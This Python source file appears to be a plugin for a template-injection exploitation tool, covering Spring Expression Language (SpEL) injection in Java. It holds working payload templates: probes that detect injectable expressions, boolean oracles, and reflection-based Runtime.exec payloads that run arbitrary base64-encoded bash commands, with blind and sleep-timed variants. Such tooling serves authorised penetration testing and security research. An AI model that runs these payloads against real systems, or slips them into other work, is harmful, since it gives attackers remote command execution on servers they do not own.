from core.plugin import Plugin
from core import bash
from plugins.languages import java
from utils import rand


class SpEL(java.Java):
    priority = 5
    plugin_info = {
        "Description": """Spring framework Expression Language (SpEL) injection in Java.""",
        "Authors": [
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'call': 'inject',
                'render': """{code}""",
                'header': """({header[0]}+{header[1]})+''+(""",
                'trailer': """)+''+({trailer[0]}+{trailer[1]})+''""",
                'test_render': f"""'{rand.randstrings[0]}'+(''.getClass().forName('java.lang.Integer').valueOf('2000000000')+2000000000)+'{rand.randstrings[1]}'""",
                'test_render_expected': f'{rand.randstrings[0]}-294967296{rand.randstrings[1]}'
            },
            'render_error': {
                'call': 'inject',
                'render': """{code}""",
                'header': """''.getClass().forName('java.lang.Integer').valueOf(({header[0]}+{header[1]})+''+(""",
                'trailer': """)+''+({trailer[0]}+{trailer[1]})+'ZZ')""",
                'test_render': f"""'{rand.randstrings[0]}'+(''.getClass().forName('java.lang.Integer').valueOf('2000000000')+2000000000)+'{rand.randstrings[1]}'""",
                'test_render_expected': f'{rand.randstrings[0]}-294967296{rand.randstrings[1]}'
            },
            'boolean': {
                'call': 'inject',
                'test_bool_true':  "(''.getClass().forName('java.lang.Integer').valueOf('1')/((1000000000+1000000000==2000000000)?1:0)+'')",
                'test_bool_false': "(''.getClass().forName('java.lang.Integer').valueOf('1')/((1000000000+2000000000==1000000000)?1:0)+'')",
                'verify_bool_true':  "(''.getClass().forName('java.lang.Integer').valueOf('1')/((2000000000+2000000000==-294967296)?1:0)+'')",
                'verify_bool_false': "(''.getClass().forName('java.lang.Integer').valueOf('1')/((2000000000+2000000000==-224667999)?1:0)+'')"
            },
            'execute': {
                'call': 'render',
                'execute': """''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec("/bin/bash -c {{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}").inputStream.readAllBytes())""",
            },
            'execute_boolean': {
                'call': 'inject',
                'execute_blind': """(''.getClass().forName('java.lang.Integer').valueOf('1')/((''.getClass().forName('java.lang.Runtime').getRuntime().exec("bash -c {{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}").waitFor()==0)?1:0)+'')""",
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec("bash -c {{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}&&{{sleep,{delay}}}").inputStream.readAllBytes())""",
            }
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            {'level': 1, 'prefix': '{closure}+', 'suffix': '+{rclosure}', 'closures': java.ctx_closures},
        ])

        self.language += ':spring_el'
